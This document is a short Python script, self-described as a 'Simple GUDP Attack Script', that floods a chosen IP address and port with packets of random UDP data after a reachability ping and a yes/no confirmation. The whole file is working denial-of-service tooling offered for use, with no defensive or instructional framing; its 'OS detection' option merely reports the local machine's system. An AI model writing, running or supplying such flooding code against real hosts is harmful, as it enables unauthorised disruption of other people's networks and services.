import socket
import argparse
import random
import time
import subprocess
import platform

def generate_random_data(size):
    """Generate random data of specified size."""
    return bytearray([random.randint(0, 255) for _ in range(size)])

def ping_target(target_ip):
    """Ping the target IP to check if it is reachable."""
    try:
        ping_cmd = subprocess.Popen(['ping', '-c', '1', target_ip], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        ping_result, _ = ping_cmd.communicate()
        if ping_cmd.returncode == 0:
            return True
        else:
            return False
    except Exception as e:
        print(f"Error pinging target: {e}")
        return False

def send_gudp_attack(target_ip, target_port, num_packets, verbose=False):
    """Send GUDP packets to the target."""
    udp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    try:
        for i in range(num_packets):
            data = generate_random_data(1024)
            udp_socket.sendto(data, (target_ip, target_port))
            if verbose:
                print(f"Sent packet {i+1}/{num_packets} to {target_ip}:{target_port}")
            time.sleep(0.001)  # Adjust sending rate if needed
    except socket.error as e:
        print(f"Error sending packet: {e}")
    finally:
        udp_socket.close()

def os_detection():
    """Detect the current operating system."""
    return platform.system()

def main():
    parser = argparse.ArgumentParser(description='Simple GUDP Attack Script')
    parser.add_argument('target_ip', help='Target IP address')
    parser.add_argument('target_port', type=int, help='Target port number')
    parser.add_argument('num_packets', type=int, help='Number of packets to send')
    parser.add_argument('-v', '--verbose', action='store_true', help='Verbose mode (print detailed information)')
    parser.add_argument('-o', '--os-detection', action='store_true', help='Perform OS detection')

    args = parser.parse_args()

    # Manual or help text
    if args.os_detection:
        detected_os = os_detection()
        print(f"Detected OS: {detected_os}")
        return
    
    if not ping_target(args.target_ip):
        print(f"Target {args.target_ip} is unreachable. Aborting attack.")
        return

    print(f"Target {args.target_ip} is reachable.")
    print(f"Target Port: {args.target_port}")
    print(f"Number of Packets: {args.num_packets}")
    
    confirm = input("Proceed with the attack? (y/n): ")
    if confirm.lower() != 'y':
        print("Attack aborted.")
        return

    send_gudp_attack(args.target_ip, args.target_port, args.num_packets, verbose=args.verbose)

if __name__ == "__main__":
    main()
